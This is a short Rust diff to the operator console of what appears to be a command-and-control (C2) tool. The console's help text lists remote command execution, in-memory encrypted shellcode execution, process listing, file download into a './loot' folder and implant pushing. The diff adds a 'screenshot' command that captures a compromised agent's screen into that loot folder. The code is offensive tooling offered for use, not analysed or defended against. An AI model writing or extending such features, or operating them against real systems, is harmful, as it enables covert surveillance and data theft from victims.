@@ -112,6 +112,7 @@ impl App {
                  exec <cmd...>     run command on agent\n  \
                  shellcode <file>  send encrypted shellcode to agent (in-memory exec)\n  \
                  ps                list processes on the agent\n  \
+                 screenshot        capture the agent's screen into ./loot\n  \
                  download <path>   pull a file from the agent into ./loot\n  \
                  implant <src> <dst>  push a local file to the agent\n  \
                  tasks             show task history and status\n  \
@@ -128,6 +129,7 @@ impl App {
             "sleep" => self.handle_config("sleep", rest),
             "jitter" => self.handle_config("jitter", rest),
             "shellcode" => self.handle_shellcode(rest),
+            "screenshot" => self.send_to_agent("screenshot", ""),
             "tasks" => self.show_tasks(),
             "loot" => self.show_loot(),
             "download" => self.handle_download(rest),
